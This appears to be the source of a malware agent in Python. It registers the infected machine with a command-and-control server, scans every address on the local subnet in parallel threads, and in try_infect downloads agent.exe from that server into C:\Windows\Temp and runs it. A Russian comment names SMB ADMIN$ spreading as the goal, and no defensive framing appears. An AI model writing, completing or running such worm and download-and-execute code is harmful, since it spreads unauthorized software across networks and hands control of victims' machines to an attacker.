import socket
import os
import requests
import subprocess
import threading
from shared.config import SERVER_URL

def bootstrap_register(agent_id, port):
    try:
        ip = get_local_ip()
        r = requests.post(
            f"{SERVER_URL}/api/peers/register",
            params={"id": agent_id, "ip": ip, "port": port},
            timeout=5
        )
        if r.status_code == 200:
            print(f"[{agent_id}] Registered on C2.")
    except Exception as e:
        print(f"[{agent_id}] Registration failed: {e}")

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

def propagate():
    ip_base = get_local_ip().rsplit('.', 1)[0]
    for i in range(2, 255):
        target_ip = f"{ip_base}.{i}"
        threading.Thread(target=try_infect, args=(target_ip,)).start()

def try_infect(ip):
    try:
        # Попытка скопировать и запустить агент через ADMIN$ (SMB)
        agent_url = f"{SERVER_URL}/download/agent.exe"
        local_copy = "C:\\Windows\\Temp\\agent.exe"

        r = requests.get(agent_url, timeout=5)
        if r.status_code == 200:
            with open(local_copy, "wb") as f:
                f.write(r.content)
            subprocess.Popen(local_copy, shell=True)
    except:
        pass
